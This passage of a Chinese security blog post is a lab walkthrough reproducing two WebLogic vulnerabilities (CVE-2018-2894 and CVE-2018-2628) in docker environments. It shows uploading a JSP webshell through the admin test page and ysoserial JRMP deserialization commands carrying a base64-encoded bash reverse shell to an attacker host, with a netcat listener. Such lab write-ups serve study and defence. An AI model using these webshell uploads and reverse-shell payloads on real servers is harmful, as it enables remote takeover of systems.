+<p>文件上传的路径为<a target="_blank" rel="noopener" href="http://your-ip:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84%E6%97%B6%E9%97%B4%E6%88%B3%E8%8E%B7%E5%8F%96%E6%96%B9%E5%BC%8F%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%8C%E5%85%B6%E4%B8%80%E4%B8%BAbp%E6%8A%93%E5%8C%85%E6%9F%A5%E7%9C%8B%EF%BC%8C">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，这里的时间戳获取方式有两种，其一为bp抓包查看，</a></p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718124112290.png" alt="image-20240718124112290"></p>
+<p>其二利用浏览器自带的检查获取，如下所示：</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718123631916.png" alt="image-20240718123631916"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.14.149:7001/ws_utc/css/config/keystore/1721275902739_ma.jsp</span><br></pre></td></tr></table></figure>
+
+<p>这里的环境有点问题，待测，重新用docker起了环境，重复上述步骤</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719104623897.png" alt="image-20240719104623897"></p>
+<p>这里先去靶场看看后台账户密码，默认管理员用户是weblogic，此处密码为h3L0YiTp</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719104726677.png" alt="image-20240719104726677"></p>
+<p>输入账户密码，登录后台</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719104859192.png" alt="image-20240719104859192"></p>
+<p>成功登录进去，点击base_domain可看到设置页面，然后点击高级，勾选启用Web服务测试页；</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105013862.png" alt="image-20240719105013862"></p>
+<p>点击保存</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105135228.png" alt="image-20240719105135228"></p>
+<p>访问漏洞页面<a target="_blank" rel="noopener" href="http://192.168.174.137:7001/ws_utc/config.do%EF%BC%88%E9%9C%80%E8%A6%81%E6%89%8B%E5%8A%A8%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%8B%E7%8E%AF%E5%A2%83%E8%AE%BE%E7%BD%AEWork">http://192.168.174.137:7001/ws_utc/config.do（需要手动设置一下环境设置Work</a> Home Dir为，&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css）</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105223765.png" alt="image-20240719105223765"></p>
+<p>点击安全 -&gt; 添加，名字和密码可以随意设置，上传jsp木马文件（登录密码为rebeyond）；</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105321462.png" alt="image-20240719105321462"></p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105401564.png" alt="image-20240719105401564"></p>
+<p>文件上传的路径为<a target="_blank" rel="noopener" href="http://192.168.174.137:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]">http://192.168.174.137:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</a></p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105432337.png" alt="image-20240719105432337"></p>
+<p>尝试访问文件地址，发现文件存在且可以正常访问</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105519747.png" alt="image-20240719105519747"></p>
+<p>冰蝎连接</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105611812.png" alt="image-20240719105611812"></p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105644878.png" alt="image-20240719105644878"></p>
+<p>成功获得shell</p>
+<h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p>WebLogic T3协议反序列化命令执行漏洞(CVE-2018-2628)。Oracle WebLogic Server的T3通讯协议的实现中存在反序列化漏洞。远程攻击者通过T3协议在Weblogic Server中执行反序列化操作，利用RMI（远程方法调用） 机制的缺陷，通过 JRMP 协议（Java远程方法协议）达到执行任意反序列化代码，进而造成远程代码执行</p>
+<p>同为WebLogic T3引起的反序列化漏洞还有CVE-2015-4852、CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2018-2893、CVE-2016-0638</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h3><p>在InboundMsgAbbrev中resolveProxyClass中，resolveProxyClass是处理rmi接口类型的，只判断了java.rmi.registry.Registry，这就会导致任意一个rmi接口都可绕过。核心部分就是JRMP（Java Remote Method protocol），在这个PoC中会序列化一个RemoteObjectInvocationHandler，它会利用UnicastRef建立到远端的tcp连接获取RMI registry，加载回来再利用readObject解析，从而造成反序列化远程代码执行。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h3><p>docker-compose起环境，访问</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718210439993.png" alt="image-20240718210439993"></p>
+<p>这里先使用nmap扫描一下是否开启了WebLogic T3服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -n -v -p 7001,7002 192.168.174.137 --script=weblogic-t3-info</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718211002989.png" alt="image-20240718211002989"></p>
+<p>漏洞检测脚本，好多扫不出来，试试以前的旧版本</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718231224408.png" alt="image-20240718231224408"></p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718212511966.png" alt="image-20240718212511966"></p>
+<p>要专门这个探测工具才行。。但教程很多都是用旧版的ysoserial-0.1-cve-2018-2628-all，我试试新版的工具怎么用</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/st3pby/article/details/135111050">https://blog.csdn.net/st3pby/article/details/135111050</a></p>
+<p>启动JRMP Server（下面这个是练习）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 192.168.174.160 1099 CommonsCollections1 whoami</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.174.160:9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>base64编码<a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec">https://ares-x.com/tools/runtime-exec</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<p>开启JMRP Server服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>本地监听9999端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure>
+
+<p>这个payload还有点难生成xxd装不上记得更新下源</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar JRMPClient 192.168.174.160:7777 | xxd -p | tr -d $&#x27;\n&#x27; &amp;&amp; echo #JRMP监听的端口</span><br></pre></td></tr></table></figure>
+
+<p>和之前的比，payload没有2了是JRMPClient</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718234851924.png" alt="image-20240718234851924"></p>
+<p>替换payload</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718234930633.png" alt="image-20240718234930633"></p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718234944773.png" alt="image-20240718234944773"></p>
+<p>半天没弹回来，保留一下，用别的方法测测</p>
+<p>在攻击机设置好JRM服务,这里执行touch命令时，注意路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;touch /mytest.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719000106128.png" alt="image-20240719000106128"></p>
+<p>打开weblogictool，如图设置好参数</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719000143387.png" alt="image-20240719000143387"></p>
+<p>执行后，在docker容器里查看,yml文件在哪就在哪执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose exec weblogic /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719000226949.png" alt="image-20240719000226949"></p>
+<p>成功执行，那回到第一种方法，利用payload，重新走一遍</p>
+<p>开启JMRP Server服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMzcvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719090315802.png" alt="image-20240719090315802"></p>
+<p>更新payload,windows下没有环境，在linux中执行,前面好像执行错了，这里客户端的ip是靶机的ip</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo java -jar ysoserial-all.jar JRMPClient 192.168.174.137:7777 | xxd -p | tr -d $&#x27;\n&#x27; &amp;&amp; echo</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719091031289.png" alt="image-20240719091031289"></p>
+<p>更换payload</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719090714180.png" alt="image-20240719090714180"></p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719091109057.png" alt="image-20240719091109057"></p>
+<p>使用 nc 进行监听本地的9999端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719091155144.png" alt="image-20240719091155144"></p>
+<p>执行poc还是不行，但后面在在kali测试好像就行了，python脚本执行完要过一会才有反弹回来。。</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719101534297.png" alt="image-20240719101534297"></p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719101931805.png" alt="image-20240719101931805"></p>
+<p>前面也弹回来了，是我没注意。。。</p>
+<p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719102247152.png" alt="image-20240719102247152"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Youzipii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/07/23/weblogic/">http://example.com/2024/07/23/weblogic/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">You_zip</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/weblogic/">weblogic</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2022/10/14/Kv1MP4ZiHeSyjd6.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/01/OSCP-004-Matrix/"><img class="prev-cover" src="/null" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">OSCP-004-Matrix</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/21/%E7%AE%80%E6%98%93%E7%88%86%E7%A0%B4poc/"><img class="next-cover" src="/null" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">简易爆破poc</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2022/10/14/Kv1MP4ZiHeSyjd6.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Youzipii</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Youzipii" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Practice makes perfect.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Weblogic"><span class="toc-number">1.</span> <span class="toc-text">Weblogic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E8%A6%81%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">简要介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-10271"><span class="toc-number">1.2.</span> <span class="toc-text">CVE-2017-10271</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">1.2.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9Epoc"><span class="toc-number">1.2.3.</span> <span class="toc-text">漏洞poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2023-21839"><span class="toc-number">1.3.</span> <span class="toc-text">CVE-2023-21839</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.3.2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%EF%BC%88%E6%9C%80%E9%9A%BE%E7%9A%84%E6%98%AF%E6%89%BE%E5%AF%B9%E5%BA%94%E7%89%88%E6%9C%AC%E7%9A%84jndi%E5%B7%A5%E5%85%B7%EF%BC%8C%E8%BF%98%E6%98%AF%E8%87%AA%E5%B7%B1%E7%90%86%E8%A7%A3%E5%90%88%E9%80%82%EF%BC%8C%E8%87%AA%E5%B7%B1%E6%A0%B9%E6%8D%AE%E5%8E%9F%E7%90%86%E6%90%AD%E4%B8%80%E4%B8%AA%EF%BC%8C%E4%BD%86java%E4%B8%8D%E7%86%9F%E6%82%89QAQ%EF%BC%89"><span class="toc-number">1.3.3.</span> <span class="toc-text">环境搭建（最难的是找对应版本的jndi工具，还是自己理解合适，自己根据原理搭一个，但java不熟悉QAQ）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-14750"><span class="toc-number">1.4.</span> <span class="toc-text">CVE-2020-14750</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">0x01 漏洞描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">0x03 漏洞验证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2018-2894"><span class="toc-number">1.5.</span> <span class="toc-text">CVE-2018-2894</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.5.1.</span> <span class="toc-text">漏洞简介</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2018-2628"><span class="toc-number">1.6.</span> <span class="toc-text">CVE-2018-2628</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.6.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><div class="content"><a class="title" href="/2024/08/06/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-zgsf-web1/" title="应急响应靶场-zgsf-web1">应急响应靶场-zgsf-web1</a><time datetime="2024-08-06T04:36:01.000Z" title="发表于 2024-08-06 12:36:01">2024-08-06</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/08/04/OSCP-005-Broken/" title="OSCP-005-Broken">OSCP-005-Broken</a><time datetime="2024-08-04T07:57:08.000Z" title="发表于 2024-08-04 15:57:08">2024-08-04</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/08/01/OSCP-004-Matrix/" title="OSCP-004-Matrix">OSCP-004-Matrix</a><time datetime="2024-08-01T12:21:41.000Z" title="发表于 2024-08-01 20:21:41">2024-08-01</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/07/23/weblogic/" title="weblogic">weblogic</a><time datetime="2024-07-23T06:48:31.000Z" title="发表于 2024-07-23 14:48:31">2024-07-23</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/07/21/%E7%AE%80%E6%98%93%E7%88%86%E7%A0%B4poc/" title="简易爆破poc">简易爆破poc</a><time datetime="2024-07-21T07:22:48.000Z" title="发表于 2024-07-21 15:22:48">2024-07-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By Youzipii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.2
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
+            const target = node.parentNode
+            if (target.nodeName.toLowerCase() === 'li') {
+              target.parentNode.classList.add('has-jax')
+            } else {
+              target.classList.add('has-jax')
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
